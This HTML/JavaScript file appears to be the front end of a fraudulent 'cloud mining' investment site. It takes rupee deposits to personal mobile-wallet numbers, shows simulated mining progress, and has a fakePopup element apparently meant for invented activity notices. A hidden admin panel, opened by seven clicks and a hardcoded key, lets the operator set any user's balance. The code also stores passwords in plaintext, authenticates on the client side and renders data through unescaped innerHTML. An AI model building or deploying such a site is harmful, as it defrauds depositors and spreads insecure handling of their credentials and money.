<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<title>VERBOSE — Financial Core</title>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --neon: #00f7ff; --accent: #7000ff; --bg: #000; --card: rgba(255,255,255,0.04); --border: rgba(255,255,255,0.08); --success: #00ff88; --error: #ff4646; --gold: #ffcc00; }
  * { box-sizing: border-box; transition: 0.4s cubic-bezier(0.1, 1, 0.1, 1); font-family: 'Plus Jakarta Sans', sans-serif; }
  body { margin:0; background: var(--bg); color: #fff; overflow-x: hidden; }

  /* AUTH & ADMIN LAYERS */
  #authPage, #adminDash { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; padding: 20px; }
  #adminDash { z-index: 99999; display: none; overflow-y: auto; align-items: flex-start; }
  .auth-box, .admin-box { width: 100%; max-width: 450px; background: var(--card); border: 1px solid var(--border); padding: 30px; border-radius: 40px; backdrop-filter: blur(30px); }

  /* UI COMPONENTS */
  header { text-align: center; padding: 40px 20px 10px; font-size: 24px; font-weight: 800; letter-spacing: 12px; text-shadow: 0 0 20px var(--neon); cursor: pointer; }
  .page { max-width: 480px; margin: 0 auto; padding: 20px 20px 140px; display: none; }
  .active { display: block !important; animation: fadeIn 0.5s ease; }
  @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }

  .glass-card { background: var(--card); border: 1px solid var(--border); border-radius: 30px; padding: 20px; backdrop-filter: blur(40px); margin-bottom: 20px; position: relative; }
  input, select { width: 100%; padding: 16px; margin-top: 10px; border-radius: 18px; border: 1px solid var(--border); background: rgba(255,255,255,0.02); color: #fff; outline: none; font-size: 13px; }
  .btn-quantum { width: 100%; padding: 18px; border-radius: 20px; border: none; font-weight: 800; text-transform: uppercase; cursor: pointer; letter-spacing: 2px; background: linear-gradient(135deg, var(--neon), var(--accent)); color: #fff; box-shadow: 0 8px 25px rgba(112,0,255,0.25); margin-top: 15px; }

  /* NAV BAR */
  .nav { position: fixed; bottom: 30px; left: 15px; right: 15px; background: rgba(10,10,10,0.9); display: none; justify-content: space-around; padding: 20px; border-radius: 40px; border: 1px solid var(--border); z-index: 1000; backdrop-filter: blur(15px); }
  .nav-item { font-size: 8px; opacity: 0.4; color: #fff; font-weight: 800; text-transform: uppercase; text-align: center; cursor: pointer; }
  .nav-item.active { opacity: 1; color: var(--neon); }

  #fakePopup { position: fixed; bottom: 110px; left: 20px; background: rgba(20,20,20,0.95); border: 1px solid var(--neon); padding: 10px 15px; border-radius: 15px; display: none; z-index: 9000; font-size: 9px; box-shadow: 0 0 15px var(--neon); }
  .hidden { display: none !important; }
</style>
</head>
<body>

<div id="authPage">
    <div class="auth-box">
        <h1 id="authTitle" style="letter-spacing:5px;">AUTHORIZE</h1>
        <div id="loginForm">
            <input id="logUser" placeholder="Username">
            <input id="logPass" type="password" placeholder="Password">
            <button class="btn-quantum" onclick="handleLogin()">ACCESS TERMINAL</button>
            <p style="font-size:10px; margin-top:15px; opacity:0.5;" onclick="toggleAuth('reg')">Create New Identity</p>
        </div>
        <div id="regForm" class="hidden">
            <input id="regUser" placeholder="Unique Username">
            <input id="regPass" type="password" placeholder="Password">
            <button class="btn-quantum" onclick="handleReg()">INITIALIZE</button>
            <p style="font-size:10px; margin-top:15px; opacity:0.5;" onclick="toggleAuth('login')">Back to Login</p>
        </div>
    </div>
</div>

<header id="adminTrigger">VERBOSE</header>

<div id="dash" class="page">
    <div class="glass-card" style="background: linear-gradient(135deg, #0a0a0a, #000); border-color: var(--neon);">
        <h2 id="hiUser" style="margin:0;">Operator</h2>
        <div style="font-size:42px; font-weight:800; margin:10px 0; color:var(--neon);">PKR <span id="uBal">0.00</span></div>
        <div id="activeMining" style="display:none; border-top:1px solid #222; padding-top:15px; margin-top:10px;">
            <div style="display:flex; justify-content:space-between; font-size:10px; color:var(--success); font-weight:800;">
                <span>CLOUD MINING: ACTIVE</span>
                <span id="timer">24:00:00</span>
            </div>
            <div style="height:4px; background:#111; margin-top:8px; border-radius:5px; overflow:hidden;"><div id="progressBar" style="width:0%; height:100%; background:var(--success);"></div></div>
        </div>
    </div>
    <div id="plansContainer"></div>
</div>

<div id="finance" class="page">
    <div class="glass-card">
        <h3 style="color:var(--success); margin-top:0;">DEPOSIT ASSETS</h3>
        <select id="depMethod" style="margin-bottom:10px;">
            <option value="EasyPaisa">EasyPaisa (03379827882)</option>
            <option value="JazzCash">JazzCash (03705519562)</option>
            <option value="SadaPay">SadaPay (03705519562)</option>
        </select>
        <input id="depAmt" type="number" placeholder="Amount (PKR)">
        <input id="depTID" placeholder="Transaction ID (TID)">
        <p style="font-size:10px; opacity:0.5; margin-top:10px;">Upload Payment Screenshot Proof:</p>
        <input type="file" id="depProof" accept="image/*" style="font-size:10px;">
        <button class="btn-quantum" style="background:var(--success);" onclick="submitDeposit()">SUBMIT DEPOSIT</button>
    </div>

    <div class="glass-card" style="border-color:var(--error);">
        <h3 style="color:var(--error); margin-top:0;">WITHDRAWAL</h3>
        <input id="witName" placeholder="Account Title Name">
        <input id="witNum" placeholder="Account Number">
        <select id="witMethod">
            <option value="JazzCash">JazzCash</option>
            <option value="EasyPaisa">EasyPaisa</option>
            <option value="Bank/SadaPay">SadaPay/Bank</option>
        </select>
        <input id="witAmt" type="number" placeholder="Withdraw Amount">
        <button class="btn-quantum" style="background:var(--error);" onclick="submitWithdraw()">REQUEST PAYOUT</button>
    </div>
</div>

<div id="history" class="page">
    <h3 style="letter-spacing:3px;">TRANSACTION LOGS</h3>
    <div id="historyList"></div>
</div>

<div id="adminDash">
    <div class="admin-box">
        <h3 style="color:var(--neon);">ROOT_CONTROL</h3>
        <div class="glass-card" style="background:#111;">
            <small>PENDING REQUESTS</small>
            <div id="adminRequests" style="font-size:11px; margin-top:10px;">No pending signals...</div>
        </div>
        <div class="glass-card">
            <small>USER OVERRIDE</small>
            <input id="admU" class="ghost-input" placeholder="User Name">
            <input id="admB" class="ghost-input" type="number" placeholder="Set Balance">
            <button class="btn-quantum" onclick="admUpdate()">INJECT</button>
        </div>
        <button onclick="document.getElementById('adminDash').style.display='none'" class="btn-quantum" style="background:none; border:1px solid #444;">EXIT</button>
    </div>
</div>

<div id="fakePopup"></div>

<div class="nav" id="mainNav">
    <div class="nav-item active" onclick="tab('dash', this)">Nodes</div>
    <div class="nav-item" onclick="tab('finance', this)">Wallet</div>
    <div class="nav-item" onclick="tab('history', this)">Logs</div>
    <div class="nav-item" onclick="logout()">Logout</div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getDatabase, ref, set, update, onValue, get, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
  import { getStorage, ref as sRef, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";

  const firebaseConfig = {
    apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
    authDomain: "verbose-6c008.firebaseapp.com",
    projectId: "verbose-6c008",
    storageBucket: "verbose-6c008.appspot.com",
    databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
    appId: "1:867100945312:web:315dfb48fb34496cee12c5"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);
  const storage = getStorage(app);

  let user = localStorage.getItem('v_user');

  // --- AUTH ---
  window.toggleAuth = (t) => { document.getElementById('loginForm').classList.toggle('hidden', t==='reg'); document.getElementById('regForm').classList.toggle('hidden', t==='login'); };
  window.handleReg = async () => {
    const u = document.getElementById('regUser').value.trim().toLowerCase();
    const p = document.getElementById('regPass').value;
    if(!u || !p) return alert("Fill all fields!");
    const s = await get(ref(db, 'users/'+u));
    if(s.exists()) return alert("Name Taken!");
    await set(ref(db, 'users/'+u), { username: u, pass: p, balance: 0, dailyProfit: 0 });
    alert("Success! Login now."); toggleAuth('login');
  };
  window.handleLogin = async () => {
    const u = document.getElementById('logUser').value.trim().toLowerCase();
    const p = document.getElementById('logPass').value;
    const s = await get(ref(db, 'users/'+u));
    if(s.exists() && s.val().pass === p) { localStorage.setItem('v_user', u); location.reload(); }
    else alert("Failed!");
  };
  window.logout = () => { localStorage.removeItem('v_user'); location.reload(); };

  // --- DEPOSIT & WITHDRAW ---
  window.submitDeposit = async () => {
    const amt = document.getElementById('depAmt').value;
    const tid = document.getElementById('depTID').value;
    const file = document.getElementById('depProof').files[0];
    if(!amt || !tid || !file) return alert("All fields + Proof required!");

    const proofRef = sRef(storage, `proofs/${user}_${Date.now()}`);
    await uploadBytes(proofRef, file);
    const url = await getDownloadURL(proofRef);

    const reqRef = push(ref(db, 'admin/deposits'));
    await set(reqRef, { user, amt, tid, url, status: 'Pending', date: new Date().toLocaleString() });
    
    const histRef = push(ref(db, `history/${user}`));
    await set(histRef, { type: 'Deposit', amount: amt, status: 'Pending', date: new Date().toLocaleString() });
    alert("Deposit sent for verification, sweetie!");
  };

  window.submitWithdraw = async () => {
    const amt = document.getElementById('witAmt').value;
    const name = document.getElementById('witName').value;
    const num = document.getElementById('witNum').value;
    const method = document.getElementById('witMethod').value;
    
    const uSnap = await get(ref(db, `users/${user}`));
    if(uSnap.val().balance < amt) return alert("Insufficient Balance!");

    const reqRef = push(ref(db, 'admin/withdraws'));
    await set(reqRef, { user, amt, name, num, method, status: 'Pending' });
    await update(ref(db, `users/${user}`), { balance: uSnap.val().balance - amt });
    
    const histRef = push(ref(db, `history/${user}`));
    await set(histRef, { type: 'Withdraw', amount: amt, status: 'Pending', date: new Date().toLocaleString() });
    alert("Withdrawal request received!");
  };

  // --- INIT DATA ---
  if(user) {
    document.getElementById('authPage').style.display='none';
    document.getElementById('mainNav').style.display='flex';
    document.getElementById('dash').classList.add('active');
    onValue(ref(db, `users/${user}`), s => document.getElementById('uBal').innerText = s.val().balance.toLocaleString());
    onValue(ref(db, `history/${user}`), s => {
        const list = document.getElementById('historyList');
        list.innerHTML = '';
        if(s.exists()) Object.values(s.val()).reverse().forEach(h => {
            list.innerHTML += `<div class="glass-card" style="padding:15px; display:flex; justify-content:space-between;">
                <div><b>${h.type}</b><br><small>${h.date}</small></div>
                <div style="text-align:right;">PKR ${h.amount}<br><small style="color:${h.status==='Pending'?'var(--gold)':'var(--success)'}">${h.status}</small></div>
            </div>`;
        });
    });
  }

  // --- ADMIN ---
  let clicks = 0;
  document.getElementById('adminTrigger').onclick = () => { if(++clicks >= 7) { if(prompt("KEY:")==="NAZIM786") document.getElementById('adminDash').style.display='flex'; clicks=0; } };

  window.tab = (id, el) => {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
  };
</script>
</body>
</html>
